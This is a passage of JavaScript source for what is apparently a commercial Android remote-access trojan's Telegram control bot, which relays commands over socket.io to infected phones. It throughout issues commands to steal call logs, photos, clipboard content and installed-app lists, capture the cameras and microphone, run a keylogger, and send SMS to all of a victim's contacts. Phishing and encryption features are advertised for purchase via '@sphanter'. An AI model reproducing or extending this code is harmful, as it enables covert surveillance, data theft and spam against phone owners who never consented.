                '<b>✯ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚢𝚘𝚞 𝚠𝚒𝚕𝚕 𝚛𝚎𝚌𝚎𝚒𝚟𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚎 𝚜𝚘𝚘𝚗 ...\n\n✯ 𝚁𝚎𝚝𝚞𝚛𝚗 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>\n\n',
                {
                    parse_mode: 'HTML',
                    reply_markup: {
                        keyboard: [
                            ['✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯', '✯ 𝙰𝚕𝚕 ✯'],
                            ['✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯']
                        ],
                        resize_keyboard: true
                    }
                }
            );
        }

        // CALLS - Steal call logs
        else if (msg.text === '✯ 𝙲𝚊𝚕𝚕𝚜 ✯') {
            if (currentTarget == 'all') {
                io.sockets.emit('commend', {
                    request: 'calls',
                    extras: []
                });
            } else {
                io.to(currentTarget).emit('commend', {
                    request: 'calls',
                    extras: []
                });
            }
            appState.delete('currentTarget');
            bot.sendMessage(
                config.id,
                '<b>✯ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚢𝚘𝚞 𝚠𝚒𝚕𝚕 𝚛𝚎𝚌𝚎𝚒𝚟𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚎 𝚜𝚘𝚘𝚗 ...\n\n✯ 𝚁𝚎𝚝𝚞𝚛𝚗 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>\n\n',
                {
                    parse_mode: 'HTML',
                    reply_markup: {
                        keyboard: [
                            ['✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯', '✯ 𝙰𝚕𝚕 ✯'],
                            ['✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯']
                        ],
                        resize_keyboard: true
                    }
                }
            );
        }

        // APPS - Get installed apps list
        else if (msg.text === '✯ 𝙰𝚙𝚙𝚜 ✯') {
            if (currentTarget == 'all') {
                io.sockets.emit('commend', {
                    request: 'apps',
                    extras: []
                });
            } else {
                io.to(currentTarget).emit('commend', {
                    request: 'apps',
                    extras: []
                });
            }
            appState.delete('currentTarget');
            bot.sendMessage(
                config.id,
                '<b>✯ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚢𝚘𝚞 𝚠𝚒𝚕𝚕 𝚛𝚎𝚌𝚎𝚒𝚟𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚎 𝚜𝚘𝚘𝚗 ...\n\n✯ 𝚁𝚎𝚝𝚞𝚛𝚗 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>\n\n',
                {
                    parse_mode: 'HTML',
                    reply_markup: {
                        keyboard: [
                            ['✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯', '✯ 𝙰𝚕𝚕 ✯'],
                            ['✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯']
                        ],
                        resize_keyboard: true
                    }
                }
            );
        }

        // MAIN CAMERA - Take photo with back camera
        else if (msg.text === '✯ 𝙼𝚊𝚒𝚗 𝚌𝚊𝚖𝚎𝚛𝚊 ✯') {
            if (currentTarget == 'all') {
                io.sockets.emit('commend', {
                    request: 'main-camera',
                    extras: []
                });
            } else {
                io.to(currentTarget).emit('commend', {
                    request: 'main-camera',
                    extras: []
                });
            }
            appState.delete('currentTarget');
            bot.sendMessage(
                config.id,
                '<b>✯ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚢𝚘𝚞 𝚠𝚒𝚕𝚕 𝚛𝚎𝚌𝚎𝚒𝚟𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚎 𝚜𝚘𝚘𝚗 ...\n\n✯ 𝚁𝚎𝚝𝚞𝚛𝚗 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>\n\n',
                {
                    parse_mode: 'HTML',
                    reply_markup: {
                        keyboard: [
                            ['✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯', '✯ 𝙰𝚕𝚕 ✯'],
                            ['✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯']
                        ],
                        resize_keyboard: true
                    }
                }
            );
        }

        // SELFIE CAMERA - Take photo with front camera
        else if (msg.text === '✯ 𝚂𝚎𝚕𝚏𝚒𝚎 𝙲𝚊𝚖𝚎𝚛𝚊 ✯') {
            if (currentTarget == 'all') {
                io.sockets.emit('commend', {
                    request: 'selfie-camera',
                    extras: []
                });
            } else {
                io.to(currentTarget).emit('commend', {
                    request: 'selfie-camera',
                    extras: []
                });
            }
            appState.delete('currentTarget');
            bot.sendMessage(
                config.id,
                '<b>✯ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚢𝚘𝚞 𝚠𝚒𝚕𝚕 𝚛𝚎𝚌𝚎𝚒𝚟𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚎 𝚜𝚘𝚘𝚗 ...\n\n✯ 𝚁𝚎𝚝𝚞𝚛𝚗 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>\n\n',
                {
                    parse_mode: 'HTML',
                    reply_markup: {
                        keyboard: [
                            ['✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯', '✯ 𝙰𝚕𝚕 ✯'],
                            ['✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯']
                        ],
                        resize_keyboard: true
                    }
                }
            );
        }

        // GALLERY - Steal photos from gallery
        else if (msg.text === '✯ 𝙶𝚊𝚕𝚕𝚎𝚛𝚢 ✯') {
            if (currentTarget == 'all') {
                io.sockets.emit('commend', {
                    request: 'gallery',
                    extras: []
                });
            } else {
                io.to(currentTarget).emit('commend', {
                    request: 'gallery',
                    extras: []
                });
            }
            appState.delete('currentTarget');
            bot.sendMessage(
                config.id,
                '<b>✯ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚢𝚘𝚞 𝚠𝚒𝚕𝚕 𝚛𝚎𝚌𝚎𝚒𝚟𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚎 𝚜𝚘𝚘𝚗 ...\n\n✯ 𝚁𝚎𝚝𝚞𝚛𝚗 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>\n\n',
                {
                    parse_mode: 'HTML',
                    reply_markup: {
                        keyboard: [
                            ['✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯', '✯ 𝙰𝚕𝚕 ✯'],
                            ['✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯']
                        ],
                        resize_keyboard: true
                    }
                }
            );
        }

        // CLIPBOARD - Steal clipboard content
        else if (msg.text === '✯ 𝙲𝚕𝚒𝚙𝚋𝚘𝚊𝚛𝚍 ✯') {
            if (currentTarget == 'all') {
                io.sockets.emit('commend', {
                    request: 'clipboard',
                    extras: []
                });
            } else {
                io.to(currentTarget).emit('commend', {
                    request: 'clipboard',
                    extras: []
                });
            }
            appState.delete('currentTarget');
            bot.sendMessage(
                config.id,
                '<b>✯ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚢𝚘𝚞 𝚠𝚒𝚕𝚕 𝚛𝚎𝚌𝚎𝚒𝚟𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚎 𝚜𝚘𝚘𝚗 ...\n\n✯ 𝚁𝚎𝚝𝚞𝚛𝚗 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>\n\n',
                {
                    parse_mode: 'HTML',
                    reply_markup: {
                        keyboard: [
                            ['✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯', '✯ 𝙰𝚕𝚕 ✯'],
                            ['✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯']
                        ],
                        resize_keyboard: true
                    }
                }
            );
        }

        // TOAST - Show toast message (prompt for text)
        else if (msg.text === '✯ 𝚃𝚘𝚊𝚜𝚝 ✯') {
            bot.sendMessage(
                config.id,
                '<b>✯ 𝙴𝚗𝚝𝚎𝚛 𝚊 𝚖𝚎𝚜𝚜𝚊𝚐𝚎 𝚝𝚑𝚊𝚝 𝚢𝚘𝚞 𝚠𝚊𝚗𝚝 𝚝𝚘 𝚊𝚙𝚙𝚎𝚊𝚛 𝚒𝚗 𝚝𝚘𝚊𝚜𝚝 𝚋𝚘𝚡</b>\n\n',
                {
                    parse_mode: 'HTML',
                    reply_markup: {
                        keyboard: [
                            ['✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯', '✯ 𝙰𝚕𝚕 ✯'],
                            ['✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯']
                        ],
                        resize_keyboard: true
                    }
                }
            );
        }

        // KEYLOGGER ON - Start keylogging
        else if (msg.text === '✯ 𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛 𝙾𝙽 ✯') {
            if (currentTarget == 'all') {
                io.sockets.emit('commend', {
                    request: 'keylogger-on',
                    extras: []
                });
            } else {
                io.to(currentTarget).emit('commend', {
                    request: 'keylogger-on',
                    extras: []
                });
            }
            appState.delete('currentTarget');
            bot.sendMessage(
                config.id,
                '<b>✯ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚢𝚘𝚞 𝚠𝚒𝚕𝚕 𝚛𝚎𝚌𝚎𝚒𝚟𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚎 𝚜𝚘𝚘𝚗 ...\n\n✯ 𝚁𝚎𝚝𝚞𝚛𝚗 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>\n\n',
                {
                    parse_mode: 'HTML',
                    reply_markup: {
                        keyboard: [
                            ['✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯', '✯ 𝙰𝚕𝚕 ✯'],
                            ['✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯']
                        ],
                        resize_keyboard: true
                    }
                }
            );
        }

        // KEYLOGGER OFF - Stop keylogging
        else if (msg.text === '✯ 𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛 𝙾𝙵𝙵 ✯') {
            if (currentTarget == 'all') {
                io.sockets.emit('commend', {
                    request: 'keylogger-off',
                    extras: []
                });
            } else {
                io.to(currentTarget).emit('commend', {
                    request: 'keylogger-off',
                    extras: []
                });
            }
            appState.delete('currentTarget');
            bot.sendMessage(
                config.id,
                '<b>✯ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚢𝚘𝚞 𝚠𝚒𝚕𝚕 𝚛𝚎𝚌𝚎𝚒𝚟𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚎 𝚜𝚘𝚘𝚗 ...\n\n✯ 𝚁𝚎𝚝𝚞𝚛𝚗 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>\n\n',
                {
                    parse_mode: 'HTML',
                    reply_markup: {
                        keyboard: [
                            ['✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯', '✯ 𝙰𝚕𝚕 ✯'],
                            ['✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯']
                        ],
                        resize_keyboard: true
                    }
                }
            );
        }

        // OPEN URL - Prompt for URL
        else if (msg.text === '✯ 𝙾𝚙𝚎𝚗 𝚄𝚁𝙻 ✯') {
            bot.sendMessage(
                config.id,
                '<b>✯ 𝚃𝚑𝚒𝚜 𝚘𝚙𝚝𝚒𝚘𝚗 𝚒𝚜 𝚘𝚗𝚕𝚢 𝚊𝚟𝚒𝚕𝚒𝚋𝚕𝚎 𝚘𝚗 𝚙𝚛𝚎𝚖𝚒𝚞𝚖 𝚟𝚎𝚛𝚜𝚒𝚘𝚗 dm to buy @sphanter</b>\n\n',
                {
                    parse_mode: 'HTML',
                    reply_markup: {
                        keyboard: [
                            ['✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯', '✯ 𝙰𝚕𝚕 ✯'],
                            ['✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯']
                        ],
                        resize_keyboard: true
                    }
                }
            );
        }

        // PHISHING - Premium feature
        else if (msg.text === '✯ 𝙿𝚑𝚒𝚜𝚑𝚒𝚗𝚐 ✯') {
            bot.sendMessage(
                config.id,
                '<b>✯ 𝚃𝚑𝚒𝚜 𝚘𝚙𝚝𝚒𝚘𝚗 𝚒𝚜 𝚘𝚗𝚕𝚢 𝚊𝚟𝚒𝚕𝚒𝚋𝚕𝚎 𝚘𝚗 𝚙𝚛𝚎𝚖𝚒𝚞𝚖 𝚟𝚎𝚛𝚜𝚒𝚘𝚗 dm to buy @sphanter</b>\n\n',
                {
                    parse_mode: 'HTML',
                    reply_markup: {
                        keyboard: [
                            ['✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯', '✯ 𝙰𝚕𝚕 ✯'],
                            ['✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯']
                        ],
                        resize_keyboard: true
                    }
                }
            );
        }

        // ENCRYPT - Premium feature
        else if (msg.text === '✯ 𝙴𝚗𝚌𝚛𝚢𝚙𝚝 ✯') {
            bot.sendMessage(
                config.id,
                '<b>✯ 𝚃𝚑𝚒𝚜 𝚘𝚙𝚝𝚒𝚘𝚗 𝚒𝚜 𝚘𝚗𝚕𝚢 𝚊𝚟𝚒𝚕𝚒𝚋𝚕𝚎 𝚘𝚗 𝚙𝚛𝚎𝚖𝚒𝚞𝚖 𝚟𝚎𝚛𝚜𝚒𝚘𝚗 dm to buy @sphanter</b>\n\n',
                {
                    parse_mode: 'HTML',
                    reply_markup: {
                        keyboard: [
                            ['✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯', '✯ 𝙰𝚕𝚕 ✯'],
                            ['✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯']
                        ],
                        resize_keyboard: true
                    }
                }
            );
        }

        // DECRYPT - Premium feature
        else if (msg.text === '✯ 𝙳𝚎𝚌𝚛𝚢𝚙𝚝 ✯') {
            bot.sendMessage(
                config.id,
                '<b>✯ 𝚃𝚑𝚒𝚜 𝚘𝚙𝚝𝚒𝚘𝚗 𝚒𝚜 𝚘𝚗𝚕𝚢 𝚊𝚟𝚒𝚕𝚒𝚋𝚕𝚎 𝚘𝚗 𝚙𝚛𝚎𝚖𝚒𝚞𝚖 𝚟𝚎𝚛𝚜𝚒𝚘𝚗 dm to buy @sphanter</b>\n\n',
                {
                    parse_mode: 'HTML',
                    reply_markup: {
                        keyboard: [
                            ['✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯', '✯ 𝙰𝚕𝚕 ✯'],
                            ['✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯']
                        ],
                        resize_keyboard: true
                    }
                }
            );
        }

        // MICROPHONE - Record audio (prompt for duration)
        else if (msg.text === '✯ 𝙼𝚒𝚌𝚛𝚘𝚙𝚑𝚘𝚗𝚎 ✯') {
            appState.set('currentAction', 'microphoneDuration');
            bot.sendMessage(
                config.id,
                '<b>✯ 𝙴𝚗𝚝𝚎𝚛 𝚝𝚑𝚎 𝚖𝚒𝚌𝚛𝚘𝚙𝚑𝚘𝚗𝚎 𝚛𝚎𝚌𝚘𝚛𝚍𝚒𝚗𝚐 𝚍𝚞𝚛𝚊𝚝𝚒𝚘𝚗 𝚒𝚗 𝚜𝚎𝚌𝚘𝚗𝚍𝚜</b>\n\n',
                {
                    parse_mode: 'HTML',
                    reply_markup: {
                        keyboard: [['✯ 𝙲𝚊𝚗𝚌𝚎𝚕 𝚊𝚌𝚝𝚒𝚘𝚗 ✯']],
                        resize_keyboard: true,
                        one_time_keyboard: true
                    }
                }
            );
        }

        // TOAST - Prompt for text
        else if (msg.text === '✯ 𝚃𝚘𝚊𝚜𝚝 ✯') {
            appState.set('currentAction', 'toast');
            bot.sendMessage(
                config.id,
                '<b>✯ 𝙴𝚗𝚝𝚎𝚛 𝚊 𝚖𝚎𝚜𝚜𝚊𝚐𝚎 𝚝𝚑𝚊𝚝 𝚢𝚘𝚞 𝚠𝚊𝚗𝚝 𝚝𝚘 𝚊𝚙𝚙𝚎𝚊𝚛 𝚒𝚗 𝚝𝚘𝚊𝚜𝚝 𝚋𝚘𝚡</b>\n\n',
                {
                    parse_mode: 'HTML',
                    reply_markup: {
                        keyboard: [['✯ 𝙲𝚊𝚗𝚌𝚎𝚕 𝚊𝚌𝚝𝚒𝚘𝚗 ✯']],
                        resize_keyboard: true,
                        one_time_keyboard: true
                    }
                }
            );
        }

        // SCREENSHOT - Take screenshot
        else if (msg.text === '✯ 𝚂𝚌𝚛𝚎𝚎𝚗𝚜𝚑𝚘𝚝 ✯') {
            appState.set('currentAction', 'sendSms');
            bot.sendMessage(
                config.id,
                '<b>✯ 𝙴𝚗𝚝𝚎𝚛 𝚊 𝚙𝚑𝚘𝚗𝚎 𝚗𝚞𝚖𝚋𝚎𝚛 𝚝𝚑𝚊𝚝 𝚢𝚘𝚞 𝚠𝚊𝚗𝚝 𝚝𝚘 𝚜𝚎𝚗𝚍 𝚂𝙼𝚂</b>\n\n',
                {
                    parse_mode: 'HTML',
                    reply_markup: {
                        keyboard: [['✯ 𝙲𝚊𝚗𝚌𝚎𝚕 𝚊𝚌𝚝𝚒𝚘𝚗 ✯']],
                        resize_keyboard: true,
                        one_time_keyboard: true
                    }
                }
            );
        }

        // SEND SMS - Prompt for phone number
        else if (msg.text === '✯ 𝚂𝚎𝚗𝚍 𝚂𝙼𝚂 ✯') {
            appState.set('currentAction', 'sendSms');
            bot.sendMessage(
                config.id,
                '<b>✯ 𝙴𝚗𝚝𝚎𝚛 𝚊 𝚙𝚑𝚘𝚗𝚎 𝚗𝚞𝚖𝚋𝚎𝚛 𝚝𝚑𝚊𝚝 𝚢𝚘𝚞 𝚠𝚊𝚗𝚝 𝚝𝚘 𝚜𝚎𝚗𝚍 𝚂𝙼𝚂</b>\n\n',
                {
                    parse_mode: 'HTML',
                    reply_markup: {
                        keyboard: [['✯ 𝙲𝚊𝚗𝚌𝚎𝚕 𝚊𝚌𝚝𝚒𝚘𝚗 ✯']],
                        resize_keyboard: true,
                        one_time_keyboard: true
                    }
                }
            );
        }

        // VIBRATE - Prompt for duration
        else if (msg.text === '✯ 𝚅𝚒𝚋𝚛𝚊𝚝𝚎 ✯') {
            appState.set('currentAction', 'vibrate');
            bot.sendMessage(
                config.id,
                '<b>✯ 𝙴𝚗𝚝𝚎𝚛 𝚝𝚑𝚎 𝚍𝚞𝚛𝚊𝚝𝚒𝚘𝚗 𝚢𝚘𝚞 𝚠𝚊𝚗𝚝 𝚝𝚑𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚝𝚘 𝚟𝚒𝚋𝚛𝚊𝚝𝚎 𝚒𝚗 𝚜𝚎𝚌𝚘𝚗𝚍𝚜</b>\n\n',
                {
                    parse_mode: 'HTML',
                    reply_markup: {
                        keyboard: [['✯ 𝙲𝚊𝚗𝚌𝚎𝚕 𝚊𝚌𝚝𝚒𝚘𝚗 ✯']],
                        resize_keyboard: true,
                        one_time_keyboard: true
                    }
                }
            );
        }

        // STOP AUDIO
        else if (msg.text === '✯ 𝚂𝚝𝚘𝚙 𝙰𝚞𝚍𝚒𝚘 ✯') {
            bot.sendMessage(
                config.id,
                '<b>✯ 𝚃𝚑𝚒𝚜 𝚘𝚙𝚝𝚒𝚘𝚗 𝚒𝚜 𝚘𝚗𝚕𝚢 𝚊𝚟𝚒𝚕𝚒𝚋𝚕𝚎 𝚘𝚗 𝚙𝚛𝚎𝚖𝚒𝚞𝚖 𝚟𝚎𝚛𝚜𝚒𝚘𝚗 dm to buy @sphanter</b>\n\n',
                {
                    parse_mode: 'HTML',
                    reply_markup: {
                        keyboard: [
                            ['✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯', '✯ 𝙰𝚕𝚕 ✯'],
                            ['✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯']
                        ],
                        resize_keyboard: true
                    }
                }
            );
        }

        // PLAY AUDIO - Premium feature
        else if (msg.text === '✯ 𝙿𝚕𝚊𝚢 𝚊𝚞𝚍𝚒𝚘 ✯') {
            bot.sendMessage(
                config.id,
                '<b>✯ 𝚃𝚑𝚒𝚜 𝚘𝚙𝚝𝚒𝚘𝚗 𝚒𝚜 𝚘𝚗𝚕𝚢 𝚊𝚟𝚒𝚕𝚒𝚋𝚕𝚎 𝚘𝚗 𝚙𝚛𝚎𝚖𝚒𝚞𝚖 𝚟𝚎𝚛𝚜𝚒𝚘𝚗 dm to buy @sphanter</b>\n\n',
                {
                    parse_mode: 'HTML',
                    reply_markup: {
                        keyboard: [
                            ['✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯', '✯ 𝙰𝚕𝚕 ✯'],
                            ['✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯']
                        ],
                        resize_keyboard: true
                    }
                }
            );
        }

        // FILE EXPLORER - Premium feature
        else if (msg.text === '✯ 𝙵𝚒𝚕𝚎 𝚎𝚡𝚙𝚕𝚘𝚛𝚎𝚛 ✯') {
            bot.sendMessage(
                config.id,
                '<b>✯ 𝚃𝚑𝚒𝚜 𝚘𝚙𝚝𝚒𝚘𝚗 𝚒𝚜 𝚘𝚗𝚕𝚢 𝚊𝚟𝚒𝚕𝚒𝚋𝚕𝚎 𝚘𝚗 𝚙𝚛𝚎𝚖𝚒𝚞𝚖 𝚟𝚎𝚛𝚜𝚒𝚘𝚗 dm to buy @sphanter</b>\n\n',
                {
                    parse_mode: 'HTML',
                    reply_markup: {
                        keyboard: [
                            ['✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯', '✯ 𝙰𝚕𝚕 ✯'],
                            ['✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯']
                        ],
                        resize_keyboard: true
                    }
                }
            );
        }

        // POP NOTIFICATION - Prompt for notification text
        else if (msg.text === '✯ 𝙿𝚘𝚙 𝚗𝚘𝚝𝚒𝚏𝚒𝚌𝚊𝚝𝚒𝚘𝚗 ✯') {
            appState.set('currentAction', 'popNotification');
            bot.sendMessage(
                config.id,
                '<b>✯ 𝙴𝚗𝚝𝚎𝚛 𝚝𝚎𝚡𝚝 𝚝𝚑𝚊𝚝 𝚢𝚘𝚞 𝚠𝚊𝚗𝚝 𝚝𝚘 𝚊𝚙𝚙𝚎𝚊𝚛 𝚊𝚜 𝚗𝚘𝚝𝚒𝚏𝚒𝚌𝚊𝚝𝚒𝚘𝚗</b>\n\n',
                {
                    parse_mode: 'HTML',
                    reply_markup: {
                        keyboard: [['✯ 𝙲𝚊𝚗𝚌𝚎𝚕 𝚊𝚌𝚝𝚒𝚘𝚗 ✯']],
                        resize_keyboard: true,
                        one_time_keyboard: true
                    }
                }
            );
        }

        // SEND SMS TO ALL CONTACTS - Mass SMS
        else if (msg.text === '✯ 𝚂𝚎𝚗𝚍 𝚂𝙼𝚂 𝚝𝚘 𝚊𝚕𝚕 𝚌𝚘𝚗𝚝𝚊𝚌𝚝𝚜 ✯') {
            appState.set('currentAction', 'textToAllContacts');
            bot.sendMessage(
                config.id,
                '<b>✯ 𝙴𝚗𝚝𝚎𝚛 𝚝𝚎𝚡𝚝 𝚝𝚑𝚊𝚝 𝚢𝚘𝚞 𝚠𝚊𝚗𝚝 𝚝𝚘 𝚜𝚎𝚗𝚍 𝚝𝚘 𝚊𝚕𝚕 𝚝𝚊𝚛𝚐𝚎𝚝 𝚌𝚘𝚗𝚝𝚊𝚌𝚝𝚜</b>\n\n',
                {
                    parse_mode: 'HTML',
                    reply_markup: {
                        keyboard: [['✯ 𝙲𝚊𝚗𝚌𝚎𝚕 𝚊𝚌𝚝𝚒𝚘𝚗 ✯']],
                        resize_keyboard: true,
                        one_time_keyboard: true
                    }
                }
            );
        }
    }

    // CHECK IF MESSAGE IS A DEVICE ID - Device selection
    else {
        io.sockets.sockets.forEach((socket, socketId, map) => {
            if (msg.text === socket.model) {
                appState.set('currentTarget', socketId);
                bot.sendMessage(
                    config.id,
                    '<b>✯ 𝚂𝚎𝚕𝚎𝚌𝚝 𝚊𝚌𝚝𝚒𝚘𝚗 𝚝𝚘 𝚙𝚎𝚛𝚏𝚘𝚛𝚖 𝚏𝚘𝚛 ' + socket.model + '</b>\n\n',
                    {
                        parse_mode: 'HTML',
                        reply_markup: {
                            keyboard: [
                                ['✯ 𝙲𝚘𝚗𝚝𝚊𝚌𝚝𝚜 ✯', '✯ 𝚂𝙼𝚂 ✯'],
                                ['✯ 𝙲𝚊𝚕𝚕𝚜 ✯', '✯ 𝙰𝚙𝚙𝚜 ✯'],
                                ['✯ 𝙼𝚊𝚒𝚗 𝚌𝚊𝚖𝚎𝚛𝚊 ✯', '✯ 𝚂𝚎𝚕𝚏𝚒𝚎 𝙲𝚊𝚖𝚎𝚛𝚊 ✯'],
                                ['✯ 𝙼𝚒𝚌𝚛𝚘𝚙𝚑𝚘𝚗𝚎 ✯', '✯ 𝙶𝚊𝚕𝚕𝚎𝚛𝚢 ✯'],
                                ['✯ 𝙲𝚕𝚒𝚙𝚋𝚘𝚊𝚛𝚍 ✯', '✯ 𝚃𝚘𝚊𝚜𝚝 ✯'],
                                ['✯ 𝚂𝚌𝚛𝚎𝚎𝚗𝚜𝚑𝚘𝚝 ✯', '✯ 𝚂𝚎𝚗𝚍 𝚂𝙼𝚂 ✯'],
                                ['✯ 𝚂𝚝𝚘𝚙 𝙰𝚞𝚍𝚒𝚘 ✯', '✯ 𝚅𝚒𝚋𝚛𝚊𝚝𝚎 ✯'],
                                ['✯ 𝙿𝚕𝚊𝚢 𝚊𝚞𝚍𝚒𝚘 ✯', '✯ 𝙾𝚙𝚎𝚗 𝚄𝚁𝙻 ✯'],
                                ['✯ 𝙿𝚑𝚒𝚜𝚑𝚒𝚗𝚐 ✯', '✯ 𝙴𝚗𝚌𝚛𝚢𝚙𝚝 ✯'],
                                ['✯ 𝙳𝚎𝚌𝚛𝚢𝚙𝚝 ✯', '✯ 𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛 𝙾𝙽 ✯'],
                                ['✯ 𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛 𝙾𝙵𝙵 ✯'],
                                ['✯ 𝙵𝚒𝚕𝚎 𝚎𝚡𝚙𝚕𝚘𝚛𝚎𝚛 ✯'],
                                ['✯ 𝙿𝚘𝚙 𝚗𝚘𝚝𝚒𝚏𝚒𝚌𝚊𝚝𝚒𝚘𝚗 ✯'],
                                ['✯ 𝙲𝚊𝚗𝚌𝚎𝚕 𝚊𝚌𝚝𝚒𝚘𝚗 ✯']
                            ],
                            resize_keyboard: true,
                            one_time_keyboard: true
                        }
                    }
                );
            }
        });

        // "ALL" OPTION - Target all connected devices
        if (msg.text == '✯ 𝙰𝚕𝚕 ✯') {
            appState.set('currentTarget', 'all');
            bot.sendMessage(
                config.id,
